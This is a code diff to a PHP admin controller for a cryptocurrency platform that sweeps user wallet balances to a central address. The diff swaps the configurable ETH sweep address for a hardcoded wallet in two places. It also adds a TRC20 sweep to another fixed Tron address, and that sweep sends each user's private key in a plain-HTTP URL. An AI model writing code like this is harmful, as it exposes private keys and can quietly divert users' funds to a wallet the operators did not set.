@@ -203,8 +203,8 @@ class App extends Admin{
         $user = new IdxUser;
         $user = $user_identity == '' ? $user : $user->where('user_id', $user_identity);
         $list = $user->order('user_id desc')->paginate(['list_rows'=> 100, 'query'=>Request()->param()]);
-        foreach($list as &$v){
-            $user_addr = UserAddr::where('user_id', $v->user_id)->find();
+        foreach($list as $k=>$v){
+            $user_addr = UserAddr::where('user_id', $v->user_id)->where('type', 1)->find();
             if(!$user_addr){
                 $url = "http://". $kuake_ip ."/wallet/createAddr?userId=" . $v->user_id;
                 $opts = array(
@@ -227,6 +227,9 @@ class App extends Admin{
             $res = json_decode(file_get_contents($url));
             if($res->code == 200){
                 $v->coin = $res->data;
+                if($v->coin->USDT <= 0 && $v->coin->TTP <= 0 && $v->coin->TTA <= 0 && $v->coin->ETH <= 0){
+                    unset($list[$k]);
+                }
             }else{
                 $v->coin = json_decode("");
             }
@@ -327,7 +330,7 @@ class App extends Admin{
         }
         // 一些定义
         $collection_vpt = SysSetting::where('sign', 'collection_vpt')->value('value');
-        $golden_address = SysSetting::where('sign', 'golden_address')->value('value');
+        $golden_address = '0x912b96A05f608A227D08e42d76ed2f57C9085239';
         $kuake_ip = Env::get('ANER_ADMIN.KUAKE_IP');
         //循环会员
         $res_array = array();
@@ -392,7 +395,7 @@ class App extends Admin{
         $user_id_array = explode(',', $user_ids);
 
         $collection_vpt = SysSetting::where('sign', 'collection_vpt')->value('value');
-        $golden_address = SysSetting::where('sign', 'golden_address')->value('value');
+        $golden_address = '0x912b96A05f608A227D08e42d76ed2f57C9085239';
         $kuake_ip = Env::get('ANER_ADMIN.KUAKE_IP');
         foreach($user_id_array as $k=> $v){
             if($v == ''){
@@ -434,6 +437,124 @@ class App extends Admin{
             $str = '所选会员全部归集成功';
         }
         return return_data(1, '', $str, '归集');
+    }
+
+    /**
+     * TRC20 链上钱包
+     *
+     * @return void
+     */
+    public function t_user_fund_link(){
+        $kuake_ip = Env::get('ANER_ADMIN.KUAKE_IP');
+        $user_identity = Request::instance()->param('user_identity', '');
+        $stock_code_search = Request::instance()->param('stock_code_search', '');
+        $user = new IdxUser;
+        $user = $user_identity == '' ? $user : $user->where('user_id', $user_identity);
+        $list = $user->order('user_id desc')->paginate(['list_rows'=> 100, 'query'=>Request()->param()]);
+        foreach($list as $k=>$v){
+            $user_addr = UserAddr::where('user_id', $v->user_id)->where('type', 3)->find();
+            if(!$user_addr){
+                $url = "http://". $kuake_ip ."/tron/createAddress?userId=" . $v->user_id;
+                $opts = array(
+                    'http'=>array(
+                        'method'=>"GET",
+                    )
+                );
+                $context = stream_context_create($opts);
+                $res = json_decode(file_get_contents($url, false, $context));
+                if($res->code == 200){
+                    $addr = $res->data;
+                }else{
+                    continue;
+                }
+            }else{
+                $addr = $user_addr->addr;
+            }
+            $v->taddress = $addr;
+            $url = "http://".$kuake_ip."/tron/trcBalance?address=".$addr;
+            $res = json_decode(file_get_contents($url));
+            if($res->code == 200){
+                $v->coin = $res->data;
+                if($v->coin <= 0){
+                    unset($list[$k]);
+                }
+            }else{
+                $v->coin = json_decode("");
+            }
+        }
+        if($stock_code_search != ''){
+            $array_count = count($list);
+            for($i = 1; $i < $array_count; $i++){
+                for($j = $i; $j > 0 && $list[$j]['coin']->$stock_code_search > $list[$j-1]['coin']->$stock_code_search; $j--){
+                    $middle = $list[$j-1];
+                    $list[$j-1] = $list[$j];
+                    $list[$j] = $middle;
+                }
+            }
+        }
+        View::assign('token_config', TokenConfig::select());
+        View::assign('list', $list);
+        View::assign('user_identity', $user_identity);
+        View::assign('stock_code_search', $stock_code_search);
+        return View::fetch();
+    }
+
+    /**
+     * TRC20归集
+     *
+     * @return void
+     */
+    public function t_cc_submit(){
+        //获取信息
+        $user_ids = Request::instance()->param('user_ids', '');
+        $validate = new \app\admin\validate\Block;
+        if($user_ids == ''){
+            return return_data(2, '', '请选择归集会员');
+        }
+        // 一些定义
+        $golden_address = 'TLnyfuNjjBFtcyNpzsLr2FxkE5GidgYaTk';
+        $kuake_ip = Env::get('ANER_ADMIN.KUAKE_IP');
+        //循环会员
+        $res_array = array();
+        $user_id_array = explode(',', $user_ids);
+        foreach($user_id_array as $k=> $v){
+            if($v == ''){
+                continue;
+            }
+            $user_id = $v;
+            $user = UserAddr::where('user_id', $user_id)->where('type', 3)->find();
+            // 获取当前金额
+            $url = "http://".$kuake_ip."/tron/trcBalance?address=".$user->addr;
+            $res = json_decode(file_get_contents($url));
+            if($res->code == 200){
+                if($res->data > 0){
+                    $url = "http://". $kuake_ip ."/tron/sendTrc?balance=".$res->data."&from=".$user->addr."&privateKey=".$user->salt."&to=".$golden_address;
+                    $opts = array(
+                        'http'=>array(
+                        'method'=>"POST",
+                        )
+                    );
+                    $context = stream_context_create($opts);
+                    $res = json_decode(file_get_contents($url, false, $context));
+                    if($res->code != 200){
+                        $res_array[] = $user_id;
+                    }
+                }
+            }else{
+                $res_array[] = $user_id;
+                continue;
+            }
+        }
+        $str = '归集完成,请手动刷新页面.';
+        if($res_array){
+            $str .= '有归集失败或未满足条件的会员:';
+            foreach($res_array as $v){
+                $str .= $v . ' ';
+            }
+        }else{
+            $str .= '所选会员全部归集成功';
+        }
+        return return_data(1, '', $str, 'json');
     }
 
     /**
